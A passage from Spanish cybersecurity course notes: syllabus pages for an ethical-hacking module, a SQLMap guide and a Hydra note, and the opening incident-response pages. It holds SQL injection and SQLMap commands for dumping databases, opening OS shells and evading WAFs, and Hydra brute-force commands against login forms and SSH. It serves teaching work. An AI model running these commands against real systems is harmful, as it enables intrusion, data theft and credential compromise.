autenticación\nImplementación de autenticación segura\n\nMateriales\n\nJWT_Tool, OAuth Playground\nBurp Suite (Autorize extension)\n2FA Bypass techniques\n\nEvaluación"},"CETI/Hacking-ético/RA-5/5b---Recolección-de-información-web":{"title":"5b - Recolección de información web","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se ha realizado un inventario de equipos, protocolos, servicios y sistemas operativos que proporcionan el servicio de una aplicación web.\n\nContenido asociado: Recolección de información.\n\nConceptos\n\nTécnicas de fingerprinting web\nAnálisis de tecnologías subyacentes\nMetodologías de enumeración de servicios web\nDescubrimiento de componentes ocultos\n\nPrácticas\n\nIdentificación de frameworks, CMS y bibliotecas\nDescubrimiento de versiones y posibles vulnerabilidades\nMapeo de la arquitectura web completa\n\nMateriales\n\nWappalyzer, Builtwith\nWhatweb, webanalyze\nNikto, Nuclei\n\nEvaluación"},"CETI/Hacking-ético/RA-5/5c---Análisis-de-interacciones-con-aplicaciones-web":{"title":"5c - Análisis de interacciones con aplicaciones web","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se ha analizado el flujo de las interacciones realizadas entre el navegador y la aplicación web durante su uso normal.\n\nContenido asociado: Automatización de conexiones a servidores web (ejemplo: Selenium).\nContenido asociado: Análisis de tráfico a través de proxies de intercepción.\n\nConceptos\n\nArquitectura cliente-servidor en aplicaciones web\nGestión de sesiones y cookies\nMecanismos de seguridad en navegadores\nTécnicas de automatización de navegación\n\nPrácticas\n\nConfiguración de proxies de intercepción\nAnálisis de solicitudes y respuestas HTTP/HTTPS\nAutomatización de flujos de navegación\n\nMateriales\n\nBurp Suite, OWASP ZAP\nSelenium, Puppeteer\nBrowser Developer Tools\n\nEvaluación"},"CETI/Hacking-ético/RA-5/5d---Búsqueda-manual-de-vulnerabilidades-web":{"title":"5d - Búsqueda manual de vulnerabilidades web","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se han examinado manualmente aplicaciones web en busca de las vulnerabilidades más habituales.\n\nContenido asociado: Búsqueda de vulnerabilidades habituales en aplicaciones web.\n\nConceptos\n\nMetodología OWASP para pruebas de seguridad\nVulnerabilidades OWASP Top 10\nTécnicas de prueba manual para cada tipo de vulnerabilidad\nBypass de controles de seguridad\n\nPrácticas\n\nBúsqueda manual de vulnerabilidades XSS, CSRF, inyección\nAnálisis de lógica de negocio y privilegios\nDocumentación de hallazgos de seguridad\n\nMateriales\n\nOWASP Testing Guide\nHerramientas manuales (proxies, extensiones de navegador)\nColección de payloads (XSS, SQLi, etc.)\n\nEvaluación"},"CETI/Hacking-ético/RA-5/5e---Herramientas-de-búsqueda-de-vulnerabilidades-web":{"title":"5e - Herramientas de búsqueda de vulnerabilidades web","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se han usado herramientas de búsquedas y explotación de vulnerabilidades web.\n\nContenido asociado: Herramientas para la explotación de vulnerabilidades web.\n\nConceptos\n\nScanners de vulnerabilidades web\nHerramientas especializadas por tipo de vulnerabilidad\nAutomatización de pruebas de seguridad\nLimitaciones de las herramientas automáticas\n\nPrácticas\n\nConfiguración y ejecución de escaneos automatizados\nValidación manual de resultados\nExplotación de vulnerabilidades con herramientas específicas\n\nMateriales\n\nOWASP ZAP, Burp Suite\nNikto, Skipfish\nSQLmap, NoSQLMap, XSSer\n\nEvaluación"},"CETI/Hacking-ético/RA-5/5f---Herramientas-de-explotación-de-vulnerabilidades-web":{"title":"5f - Herramientas de explotación de vulnerabilidades web","links":["CETI/Hacking-ético/RA-5/guías/SQLMap"],"tags":[],"content":"Criterio de evaluación:\nf) Se ha realizado la búsqueda y explotación de vulnerabilidades web mediante herramientas software.\nConceptos\n\nIntegración de herramientas en un flujo de pentesting\nTécnicas avanzadas de explotación\nPost-explotación en entornos web\nHerramientas específicas para cada tipo de vulnerabilidad\n\nPrácticas\n\nCreación de laboratorio vulnerable (DVWA, WebGoat)\nExplotación de vulnerabilidades con herramientas avanzadas\nDesarrollo de exploits personalizados\n\nMateriales\n\nMetasploit Web Modules\nWfuzz, Ffuf para fuzzing\nCadenas de herramientas para explotación completa\nWPScan\nHydra\nGobuster / dirb\nSQLMap\n\nEvaluación"},"CETI/Hacking-ético/RA-5/guías/SQLMap":{"title":"SQLMap","links":[],"tags":[],"content":"\n\t.reveal { font-size: 1.5em; }\n\t.reveal div { justify-content: flex-start  !important; }\n\t.reveal table { font-size: 0.2em; }\n\t.reveal h1 { font-size: 4em; color: #4169E1; }\n\t.reveal h2 { font-size: 3em; color: #2979FF; }\n\t.reveal h3 { font-size: 2em; color: #1E90FF; }\n\t.reveal p { font-size: 1.5em; color: black; text-align: left; }\n\t.reveal ul { align-self: flex-start;  text-align: justify; margin-left: 4.5em; margin-right: 2em }\n\t.reveal li { text-align: left; }\n\t.footnotes li { font-size: 1em;  color: grey;}\n\t.footnotes p { font-size: 1em;  color: grey;}\n\nSQLMap: Automatización de Inyecciones SQL\n\n1. Introducción\n1.1 ¿Qué es SQLMap?\n\nHerramienta de código abierto para automatizar la detección y explotación de vulnerabilidades de inyección SQL.\nDesarrollada en Python.\nSoporta una amplia gama de bases de datos.\n\n1.2 Importancia de las inyecciones SQL\n\nUna de las vulnerabilidades web más comunes y peligrosas.\nPuede llevar a la pérdida de datos confidenciales, modificación de datos o incluso control total del servidor.\n\n\n2. Funcionalidades Principales\n\nDetección de vulnerabilidades de inyección SQL.\nExplotación de vulnerabilidades para obtener información de la base de datos.\nSoporte para diferentes técnicas de inyección SQL (basadas en booleanos, basadas en errores, basadas en tiempo, etc.).\nEnumeración de bases de datos, tablas y columnas.\nExtracción de datos.\nEjecución de comandos del sistema operativo.\nSoporte para diferentes tipos de bases de datos.\n\n\n3. Conceptos básicos\n3.1 Inyección SQL: Repaso rápido\n\nTécnica de ataque que explota vulnerabilidades en aplicaciones web.\nPermite ejecutar comandos SQL maliciosos en una base de datos.\nEjemplo básico:\n\nSELECT * FROM users WHERE id = &#039;1&#039; OR &#039;1&#039;=&#039;1&#039;;\n3.2 ¿Cómo encaja SQLMap?\n\nAutomatiza la detección de puntos de inyección.\nExtrae datos (usuarios, tablas, contraseñas) sin escribir consultas manualmente.\nReduce el tiempo y esfuerzo en pruebas de seguridad.\n\n\n4. Técnicas de Inyección SQL\n\nInyecciones basadas en booleanos: Se utilizan para determinar si una condición es verdadera o falsa.\nInyecciones basadas en errores: Se aprovechan los mensajes de error de la base de datos para obtener información.\nInyecciones basadas en tiempo: Se miden los tiempos de respuesta del servidor para inferir información.\nInyecciones UNION: Se combina una consulta maliciosa con una consulta válida para extraer datos.\nInyecciones apiladas: Se ejecutan múltiples consultas SQL separadas por punto y coma.\nOut-of-band: Se usa para cuando no hay manera de obtener los resultados por el mismo canal.\n\n\n5. Instalación y requisitos\n5.1 Requisitos previos\n\nSistema operativo: Linux, Windows o macOS. 1\nPython instalado (versión compatible con SQLMap).\nDescarga desde el repositorio oficial:\n\ngit clone github.com/sqlmapproject/sqlmap.git\n5.2 Instalación básica\n\nClonar el repositorio o descargar el archivo ZIP.\nNavegar al directorio: cd sqlmap.\nEjecutar: python sqlmap.py -h para verificar.\n\n\n6. Uso básico de SQLMap\n6.1 Sintaxis general\n\nComando base: python sqlmap.py -u &quot;URL&quot; [opciones].\nEjemplo: python sqlmap.py -u &quot;example.com/page\n\n6.2 Opciones comunes\n\n-hh: Para obtener todas las opciones posibles.\n-u: Especifica la URL objetivo.\n--dbs: Enumera las bases de datos disponibles.\n--tables: Lista las tablas de una base de datos.\n--dump: Extrae los datos de una tabla.\n--schema: permite obtener información sobre la estructura de la base de datos, como bases de datos, tablas, columnas.\n\n\n6.3 Ejemplos prácticos:\n# Lista de bases de datos detectadas (ej. `information_schema`, `usuarios`)\npython sqlmap.py -u &quot;example.com/page --dbs\n \n# Enumerar tablas\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; --tables\n \n# Enumerar columnas\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; -T &lt;nombre_tabla&gt; --columns\n \n# Extraer datos\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; -T &lt;nombre_tabla&gt; -C &lt;columna1,columna2&gt; --dump\n\n7. Funcionalidades avanzadas\n7.1 Detección automática\n\n--level: Nivel de profundidad en las pruebas (1-5).\n--risk: Nivel de riesgo en las pruebas (1-3).\n\n\n7.2 Extracción de datos\n\n--dump-all: Descarga toda la base de datos.\n--sql-shell: Abre una shell SQL interactiva.\n--os-shell: Obtener una shell del sistema operativo.\n-r: Cargar una petición HTTP desde un archivo.\n--data: Enviar datos POST.\n--cookie: Especificar cookies.\n--proxy: Utilizar un proxy.\n--batch: Modo automático.\n-p: indica el parámetro que es vulnerable\n--technique: indica la técnica a emplear, por ejemplo, inyecciones basadas en booleanos (B) o usar UNION (U).\n\n\n7.3 Ejemplos complejos\n\nLas siguientes peticiciones usamos sqlmap con una request capturada. La request se puede obtener con burp suite u OWASP Zap, haciendo clic derecho y descargando la request.\nUno de los problemas que nos podemos encontrar con SQLMap es que tengamos que ignorar ciertos códigos de error, como el 401.\nA veces sucede que corta la salida de texto cuando son muchos datos a devolver. Para evitarlo se usa --no-cast y --no-escape.\nLa opción --flush se utiliza para forzar la salida inmediata de los resultados de cada consulta SQL ejecutada por la herramienta.\n\nsqlmap -r req.txt --ignore-code=401 --dbms=sqlite --level=5 --risk=3 --technique=B -T &lt;table&gt; --columns\n \nsqlmap -u http://URL?q= --dbms=sqlite --level 5 --risk 3 --schema --no-cast --no-escape\n \nsqlmap -u &#039;http://URL?q=test&#039; -p &#039;q&#039; --dbms=&quot;sqlite&quot; --technique U --prefix &quot;&#039;)) &quot; --level 5 --risk 3 --dump-all --no-cast --no-escape --flush\n\n7.4 Evasión de seguridad\n\n--tamper: Usa scripts para evadir WAFs o filtros.\n\n# Ejemplo\npython sqlmap.py -u &quot;URL&quot; --tamper=space2comment\n\n8. Demostración en vivo\n8.1 Escenario\n\nConfigurar un entorno vulnerable con DVWA github.com/digininja/DVWA\nEjecutar:\n\nsqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --dbs\n\nMostrar resultados en pantalla.\n\n\n9. Mejores prácticas y ética\n9.1 Uso responsable\n\nSQLMap, al igual que el resto de herramientas de hacking ético, solo se debe usar en entornos de prueba o con permiso explícito.\n\n9.2 Limitaciones de SQLMap\n\nNo reemplaza el análisis manual.\nPuede generar falsos positivos o negativos.\nDepende de la configuración del objetivo.\n\n\n10. Conclusión\n10.1 Resumen\n\nSQLMap es una herramienta poderosa para pruebas de inyección SQL.\nFácil de usar, pero requiere conocimientos básicos de SQL y seguridad.\nIdeal para aprender y practicar pentesting ético.\n\n10.2 Documentación\n\nDocumentación oficial de SQLMap: sqlmap.org/\n\nFootnotes\n\n\nEn kali linux ya viene instalado. ↩\n\n\n"},"CETI/Hacking-ético/RA-5/guías/hydra":{"title":"hydra","links":[],"tags":[],"content":"Hydra\nEjemplo de ruptura de login web\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.109 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot; -V\n\nRuptura de SSH\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.109 ssh\n"},"CETI/Hacking-ético/Temario":{"title":"Temario","links":["CETI/Hacking-ético/RA-1/1a---Elementos-esenciales-del-hacking-ético","CETI/Hacking-ético/RA-1/1b---Conceptos-éticos-y-legales","CETI/Hacking-ético/RA-1/1c---Alcance-y-condiciones-de-un-pentest","CETI/Hacking-ético/RA-1/1d---Principios-de-seguridad","CETI/Hacking-ético/RA-1/1e---Fases-del-hacking","CETI/Hacking-ético/RA-1/1f---Análisis-de-vulnerabilidades","CETI/Hacking-ético/RA-1/1g---Análisis-de-tipos-de-ataques","CETI/Hacking-ético/RA-1/1h---Caracterización-de-vulnerabilidades","CETI/Hacking-ético/RA-1/1i---Herramientas-de-monitorización-y-hacking","CETI/Hacking-ético/RA-2/2a---Funcionamiento-de-las-tarjetas-de-red-inalámbricas","CETI/Hacking-ético/RA-2/2b---Comunicación-de-redes-inalámbricas","CETI/Hacking-ético/RA-2/2c---Captura-de-tráfico-de-redes-inalámbricas","CETI/Hacking-ético/RA-2/2d---Ataques-y-exploración-de-redes-inalámbricas","CETI/Hacking-ético/RA-2/2e---Ataques-a-otros-sistemas-inalámbricos","CETI/Hacking-ético/RA-2/2f---Equipo-rojo-vs-azul","CETI/Hacking-ético/RA-2/2g---Realización-de-informes-de-auditoría","CETI/Hacking-ético/RA-3/3a---Escaneo-pasivo-(footprinting)","CETI/Hacking-ético/RA-3/3b---Escaneo-activo-(fingerprinting)","CETI/Hacking-ético/RA-3/3c---Monitorización-e-interceptación-de-tráfico-de-red","CETI/Hacking-ético/RA-3/3d---Ataque-de-intermediario-(Man-in-the-Middle)","CETI/Hacking-ético/RA-3/3e---Comprometer-sistemas-remotos","CETI/Hacking-ético/RA-4/4a---Administración-de-sistemas-de-manera-remota","CETI/Hacking-ético/RA-4/4b---Ataques-y-auditorías-de-contraseñas","CETI/Hacking-ético/RA-4/4c---Pivotaje-a-través-de-sistemas-comprometidos","CETI/Hacking-ético/RA-4/4d---Instalación-de-puertas-traseras","CETI/Hacking-ético/RA-5/5a---Autenticación-web","CETI/Hacking-ético/RA-5/5b---Recolección-de-información-web","CETI/Hacking-ético/RA-5/5c---Análisis-de-interacciones-con-aplicaciones-web","CETI/Hacking-ético/RA-5/5d---Búsqueda-manual-de-vulnerabilidades-web","CETI/Hacking-ético/RA-5/5e---Herramientas-de-búsqueda-de-vulnerabilidades-web","CETI/Hacking-ético/RA-5/5f---Herramientas-de-explotación-de-vulnerabilidades-web"],"tags":["Apuntes","Temas","Hacking"],"content":"Desglose del temario HE: RA - Criterios - Contenidos\nRA 1. Determina herramientas de monitorización para detectar vulnerabilidades aplicando técnicas de hacking ético.\nCriterios de evaluación:\na) Se ha definido la terminología esencial del hacking ético.\n\nContenido asociado: Elementos esenciales del hacking ético.\nEnlace con el material para impartirlo: 1a - Elementos esenciales del hacking ético\n\nb) Se han identificado los conceptos éticos y legales frente al ciberdelito.\n\nContenido asociado: Diferencias entre hacking, hacking ético, tests de penetración y hacktivismo.\nEnlace con el material para impartirlo: 1b - Conceptos éticos y legales\n\nc) Se ha definido el alcance y condiciones de un test de intrusión.\n\nContenido asociado: Recolección de permisos y autorizaciones previos a un test de intrusión.\nEnlace con el material para impartirlo: 1c - Alcance y condiciones de un pentest\n\nd) Se han identificado los elementos esenciales de seguridad: confidencialidad, autenticidad, integridad y disponibilidad.\n\nContenido asociado: Auditorías de caja negra y de caja blanca.\nEnlace con el material para impartirlo: 1d - Principios de seguridad\n\ne) Se han identificado las fases de un ataque seguidas por un atacante.\n\nContenido asociado: Fases del hacking.\nEnlace con material para impartirlo: 1e - Fases del hacking\n\nf) Se han analizado y definido los tipos vulnerabilidades.\n\nContenido asociado: Documentación de vulnerabilidades.\nEnlace con el material para impartirlo: 1f - Análisis de vulnerabilidades\n\ng) Se han analizado y definido los tipos de ataque.\n\nContenido asociado: ClearNet, Deep Web, Dark Web, Darknets. Conocimiento, diferencias y herramientas de acceso: Tor. ZeroNet, FreeNet.\nEnlace con el material para impartirlo: 1g - Análisis de tipos de ataques\n\nh) Se han determinado y caracterizado las diferentes vulnerabilidades existentes.\n\nEnlace con el material para impartirlo: 1h - Caracterización de vulnerabilidades\n\ni) Se han determinado las herramientas de monitorización disponibles en el mercado adecuadas en función del tipo de organización.\n\nContenido asociado: Clasificación de herramientas de seguridad y hacking.\nEnlace con el material para impartirlo: 1i - Herramientas de monitorización y hacking\n\nRA 2. Ataca y defiende en entornos de prueba, comunicaciones inalámbricas consiguiendo acceso a redes para demostrar sus vulnerabilidades.\nCriterios de evaluación:\na) Se han configurado los distintos modos de funcionamiento de las tarjetas de red inalámbricas.\n\nContenido asociado: Modo infraestructura, ad-hoc y monitor.\nEnlace con el material para impartirlo: 2a - Funcionamiento de las tarjetas de red inalámbricas\n\nb) Se han descrito las técnicas de encriptación de las redes inalámbricas y sus puntos vulnerables.\n\nContenido asociado: Comunicación inalámbrica.\nEnlace con el material para impartirlo: 2b - Comunicación de redes inalámbricas\n\nc) Se han detectado redes inalámbricas y se ha capturado tráfico de red como paso previo a su ataque.\n\nContenido asociado: Análisis y recolección de datos en redes inalámbricas.\nEnlace con el material para impartirlo: 2c - Captura de tráfico de redes inalámbricas\n\nd) Se ha accedido a redes inalámbricas vulnerables.\n\nContenido asociado: Técnicas de ataques y exploración de redes inalámbricas.\nEnlace con el material para impartirlo: 2d - Ataques y exploración de redes inalámbricas\n\ne) Se han caracterizado otros sistemas de comunicación inalámbricos y sus vulnerabilidades.\n\nContenido asociado: Ataques a otros sistemas inalámbricos.\nEnlace con el material para impartirlo: 2e - Ataques a otros sistemas inalámbricos\n\nf) Se han utilizado técnicas de “Equipo Rojo y Azul”.\n\nEnlace con el material para impartirlo: 2f - Equipo rojo vs azul\n\ng) Se han realizado informes sobre las vulnerabilidades detectadas.\n\nContenido asociado: Realización de informes de auditoría y presentación de resultados.\nEnlace con el material para impartirlo: 2g - Realización de informes de auditoría\n\nRA 3. Ataca y defiende en entornos de prueba, redes y sistemas consiguiendo acceso a información y sistemas de terceros.\nCriterios de evaluación:\na) Se ha recopilado información sobre la red y sistemas objetivo mediante técnicas pasivas.\n\nContenido asociado: Fase de reconocimiento (footprinting).\nEnlace con el material para impartirlo: 3a - Escaneo pasivo (footprinting)\n\nb) Se ha creado un inventario de equipos, cuentas de usuario y potenciales vulnerabilidades de la red y sistemas objetivo mediante técnicas activas.\n\nContenido asociado: Fase de escaneo (fingerprinting).\nEnlace con el material para impartirlo: 3b - Escaneo activo (fingerprinting)\n\nc) Se ha interceptado tráfico de red de terceros para buscar información sensible.\n\nContenido asociado: Monitorizacion de tráfico.\nContenido asociado: Interceptación de comunicaciones utilizando distintas técnicas.\nEnlace con el material para impartirlo: 3c - Monitorización e interceptación de tráfico de red\n\nd) Se ha realizado un ataque de intermediario, leyendo, insertando y modificando, a voluntad, el tráfico intercambiado por dos extremos remotos.\n\nContenido asociado: Manipulación e inyección de tráfico.\nEnlace con el material para impartirlo: 3d - Ataque de intermediario (Man in the Middle)\n\ne) Se han comprometido sistemas remotos explotando sus vulnerabilidades.\n\nContenido asociado: Herramientas de búsqueda y explotación de vulnerabilidades.\nContenido asociado: Ingeniería social. Phising.\nContenido asociado: Escalada de privilegios.\nEnlace con el material para impartirlo: 3e - Comprometer sistemas remotos\n\nRA 4. Consolida y utiliza sistemas comprometidos garantizando accesos futuros.\nCriterios de evaluación:\na) Se han administrado sistemas remotos a través de herramientas de línea de comandos.\n\nContenido asociado: Administración de sistemas de manera remota.\nEnlace con el material para impartirlo: 4a - Administración de sistemas de manera remota\n\nb) Se han comprometido contraseñas a través de ataques de diccionario, tablas rainbow y fuerza bruta contra sus versiones encriptadas.\n\nContenido asociado: Ataques y auditorías de contraseñas.\nEnlace con el material para impartirlo: 4b - Ataques y auditorías de contraseñas\n\nc) Se ha accedido a sistemas adicionales a través de sistemas comprometidos.\n\nContenido asociado: Pivotaje en la red.\nEnlace con el material para impartirlo: 4c - Pivotaje a través de sistemas comprometidos\n\nd) Se han instalado puertas traseras para garantizar accesos futuros a los sistemas comprometidos.\n\nContenido asociado: Instalación de puertas traseras con troyanos (RAT, Remote Access Trojan).\nEnlace con el material para impartirlo: 4d - Instalación de puertas traseras\n\nRA 5. Ataca y defiende en entornos de prueba, aplicaciones web consiguiendo acceso a datos o funcionalidades no autorizadas.\nCriterios de evaluación:\na) Se han identificado los distintos sistemas de autenticación web, destacando sus debilidades y fortalezas.\n\nContenido asociado: Negación de credenciales en aplicaciones web.\nEnlace con el material para impartirlo: 5a - Autenticación web\n\nb) Se ha realizado un inventario de equipos, protocolos, servicios y sistemas operativos que proporcionan el servicio de una aplicación web.\n\nContenido asociado: Recolección de información.\nEnlace con el material para impartirlo: 5b - Recolección de información web\n\nc) Se ha analizado el flujo de las interacciones realizadas entre el navegador y la aplicación web durante su uso normal.\n\nContenido asociado: Automatización de conexiones a servidores web (ejemplo: Selenium).\nContenido asociado: Análisis de tráfico a través de proxies de intercepción.\nEnlace con el material para impartirlo: 5c - Análisis de interacciones con aplicaciones web\n\nd) Se han examinado manualmente aplicaciones web en busca de las vulnerabilidades más habituales.\n\nContenido asociado: Búsqueda de vulnerabilidades habituales en aplicaciones web.\nEnlace con el material para impartiro: 5d - Búsqueda manual de vulnerabilidades web\n\ne) Se han usado herramientas de búsquedas y explotación de vulnerabilidades web.\n\nContenido asociado: Herramientas para la explotación de vulnerabilidades web.\nEnlace con el material para impartirlo: 5e - Herramientas de búsqueda de vulnerabilidades web\n\nf) Se ha realizado la búsqueda y explotación de vulnerabilidades web mediante herramientas software.\n\nEnlace con el material para impartirlo: 5f - Herramientas de explotación de vulnerabilidades web\n"},"CETI/Hacking-ético/index":{"title":"Hacking ético","links":["CETI/Hacking-ético/Temario"],"tags":[],"content":"Hacking ético es un módulo del curso de especialización en ciberseguridad en entornos de las tecnologías de la información (CETI). En esta documentación pretendo realizar una sugerencia de contenidos que se pueden impartir en cada uno de los resultados de aprendizaje esperados.\nTodo el temario analizado en el siguiente enlace:\n\nTemario\n\nWebs para practicar pentesting:\n\nGenerales\n\nTryHackMe: tryhackme.com/\nHackTheBox: www.hackthebox.com/\nPwned Labs: pwnedlabs.io/\nctftime.org/\n\n\nWeb\n\noverthewire.org/wargames/\nginandjuice.shop/\n\n\nPor retos\n\nAtenea (CCN-CERT)\nAcademia hacker de Incibe\n\n\nCertificaciones interesantes:\n\neJPT\nOSCP\nNo recomendada: CEH (aunque suele aparecer en infojobs)\n\n\nDistribuciones\n\nKali Linux (probar Kaboxer)\nParrotOS\n\n\n\nMateriales en general:\n\ninventory.raw.pm/overview.html\ngithub.com/bst04/CyberSources\ns0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/blue-defense/event-detection#nsm-network-security-monitoring\n"},"CETI/Incidentes-de-ciberseguridad/RA-1/1a---Principios-generales-en-materia-de-ciberseguridad":{"title":"1a - Principios generales en materia de ciberseguridad","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se han definido los principios generales de la organización en materia de ciberseguridad, que deben ser conocidos y apoyados por la dirección de la misma.\n\nContenido asociado: Principios generales en materia de ciberseguridad.\n\nPrácticas sugeridas\n\ntryhackme.com/r/room/careersincyber\ntryhackme.com/r/room/securityprinciples\ntryhackme.com/room/introtoirandim\n\nConceptos generales\n\nCIA triad: confidencialidad, integridad y disponibilidad\nCIA triad extended: añade autenticidad y no repudio\n\nGlosario de términos\n\nINCIBE: www.incibe.es/sites/default/files/contenidos/guias/doc/guia_glosario_ciberseguridad_2021.pdf\n\nFrameworks de ciberseguridad\n\nNIST: nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.1299.spa.pdf\n\nFrameworks de respuesta a incidentes\n\nNIST: nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r3.pdf\nNIST (esta guía es anterior, pero se referencia debido a la parte final de preguntas y respuestas): educacionadistancia.juntadeandalucia.es/profesorado/pluginfile.php/1633510/mod_resource/content/0/NIST.SP.800-61r2.pdf\nSANS: www.sans.org/white-papers/33901/\nIncibe\nEsquema nacional de seguridad\n"},"CETI/Incidentes-de-ciberseguridad/RA-1/1b---Normativa-de-protección-del-puesto-del-trabajo.":{"title":"1b - Normativa de protección del puesto del trabajo.","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se ha establecido una normativa de protección del puesto de trabajo.\n\nContenido asociado: Normativa de protección del puesto del trabajo.\n\nMateriales apoyo\n\nBuenas prácticas CCN-CERT: www.ccn-cert.cni.es/es/informes/informes-de-buenas-practicas-bp/2473-ccn-cert-bp-01-principios-y-recomendaciones-basicas-en-ciberseguridad/file.html\n\nPrácticas sugeridas"},"CETI/Incidentes-de-ciberseguridad/RA-1/1c---Plan-de-formación-y-concienciación-en-materia-de-ciberseguridad":{"title":"1c - Plan de formación y concienciación en materia de ciberseguridad","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se ha definido un plan de concienciación de ciberseguridad dirigido a los empleados.\n\nContenido asociado: Plan de formación y concienciación en materia de ciberseguridad.\n\nMateriales de apoyo\n\nIncibe - Guía de ciberataques: www.incibe.es/ciudadania/formacion/guias/guia-de-ciberataques\nIncibe - ciberamenazas contra entornos empresariales: www.incibe.es/sites/default/files/contenidos/guias/doc/ciberamenazas_contra_entornos_empresariales.pdf\nHay multitud de documentos de buenas prácticas del CCN-CERT: www.ccn-cert.cni.es/es/informes/informes-de-buenas-practicas-bp.html\nwww.incibe.es/empresas/formacion/kit-concienciacion\nwww.incibe.es/ciudadania/tematicas\nwww.incibe.es/aprendeciberseguridad\nnationalprivacytest.org/es\n\nPrácticas sugeridas\nHerramientas\n\nPhishing\n\nGophish getgophish.com/\nZphiser github.com/htr-tech/zphisher\n\n\n"},"CETI/Incidentes-de-ciberseguridad/RA-1/1d---Materiales-de-formación-y-concienciación":{"title":"1d - Materiales de formación y concienciación","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se ha desarrollado el material necesario para llevar a cabo las acciones de concienciación dirigidas a los empleados.\n\nContenido asociado: Materiales de formación y concienciación.\n\nMateriales de apoyo\n\nwww.incibe.es/empresas/formacion/kit-concienciacion\n\nPrácticas sugeridas\nHerramientas\n\nCanva (para la creación de carteles, gratis para docentes g.educaand.es): www.canva.com/es_es/\n"},"CETI/Incidentes-de-ciberseguridad/RA-1/1e---Auditorías-internas-de-cumplimiento-en-materia-de-prevención":{"title":"1e - Auditorías internas de cumplimiento en materia de prevención","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se ha realizado una auditoría para verificar el cumplimiento del plan de prevención y concienciación de la organización.\n\nContenido asociado: Auditorías internas de cumplimiento en materia de prevención\n\nMateriales\n\nIncibe - checklist auditoría pymes: www.incibe.es/sites/default/files/contenidos/politicas/documentos/auditoria-sistemas.pdf\nIncibe - auditoria de sistemas: www.incibe.es/empresas/blog/has-revisado-tu-nivel-seguridad-utiliza-las-auditorias-sistemas\n\nPrácticas sugeridas"},"CETI/Incidentes-de-ciberseguridad/RA-2/2a---Taxonomía-de-incidentes-de-ciberseguridad":{"title":"2a - Taxonomía de incidentes de ciberseguridad","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se ha clasificado y definido la taxonomía de incidentes de ciberseguridad que pueden afectar a la organización.\n\nContenido asociado: Taxonomía de incidentes de ciberseguridad.\n\nMateriales de apoyo\nLos siguientes materiales son amplios, lo que hay que trabajar aquí es exclusivamente la división en categorías y subcategorías de los distintos tipos de incidentes de ciberseguridad:\n\nGithub con la taxonomía de ENISA: github.com/enisaeu/Reference-Security-Incident-Taxonomy-Task-Force/blob/034cea9442ca2f704d06311bc76a6637bef8e6cb/working_copy/humanv1.md\nIncibe - guía nacional de notificación y gestión de incidentes: www.incibe.es/sites/default/files/contenidos/guias/doc/guia_nacional_notificacion_gestion_ciberincidentes.pdf\nENS - Gestión de ciberincidentes: www.ccn-cert.cni.es/es/series-ccn-stic/800-guia-esquema-nacional-de-seguridad/988-ccn-stic-817-gestion-de-ciberincidentes/file\n"},"CETI/Incidentes-de-ciberseguridad/RA-2/2b---Monitorización,-identificación,-detección-y-alerta-de-incidentes":{"title":"2b - Monitorización, identificación, detección y alerta de incidentes","links":["CETI/Incidentes-de-ciberseguridad/RA-2/guías/Wazuh","CETI/Incidentes-de-ciberseguridad/RA-2/guías/Suricata"],"tags":[],"content":"Criterio de evaluación\nb) Se han establecido controles, herramientas y mecanismos de monitorización, identificación, detección y alerta de incidentes\n\nContenido asociado: Controles, herramientas y mecanismos de monitorización, identificación, detección y alerta de incidentes: tipos y fuentes\n\nMaterial de apoyo\n\nIncibe: www.incibe.es/sites/default/files/contenidos/guias/doc/certsi_diseno_configuracion_ips_ids_siem_en_sci.pdf\n\nAquí se puede hablar de las herramientas de tipo:\n\nSIEM: ELK, Splunk o QRadar.\nEDR: Wazuh, Microsoft SentinelOne o CrowdStrike.\nNIDS/NIPS: Snort o Suricata\nHIDS/HIPS: OSSEC (incluido en Wazuh) o Fleet (incluye OSQuery)\nBehavioral Network Analyzer: Zeek\nSOAR: Catalyst\nFirewall: IPTables o NFTables\nNDR (Network Detection and Response): Zeek, Snort, Suricata, Arkime (github.com/arkime/arkime)\nHoneypots:\n\nElementos de blue team\n\nHoneypots\nIAM\n"},"CETI/Incidentes-de-ciberseguridad/RA-2/2c---Detección-e-identificación-de-incidentes-de-seguridad-física":{"title":"2c - Detección e identificación de incidentes de seguridad física","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se han establecido controles y mecanismos de detección e identificación de incidentes de seguridad física.\n\nContenido asociado: Controles, herramientas y mecanismos de detección e identificación de incidentes de seguridad física.\n\nMaterial de apoyo\n\nwww.iso27000.es/iso27002_11.html\n\nConceptos\n\nDiagramas de controles de acceso físico.\nDiscusión de tecnologías (tarjetas RFID, biometría).\nAnálisis de videos de CCTV simulados o de casos reales (si es apropiado).\nChecklists de inspección física.\n"},"CETI/Incidentes-de-ciberseguridad/RA-2/2d---Monitorización,-identificación,-detección-y-alerta-de-incidentes-a-través-de-OSINT":{"title":"2d - Monitorización, identificación, detección y alerta de incidentes a través de OSINT","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se han establecido controles, herramientas y mecanismos de monitorización, identificación, detección y alerta de incidentes a través de la investigación en fuentes abiertas (OSINT: Open Source Intelligence).\n\nContenido asociado: Controles, herramientas y mecanismos de monitorización, identificación, detección y alerta de incidentes a través de la investigación en fuentes abiertas (OSINT).\n\nMaterial de apoyo\n\nIncibe: 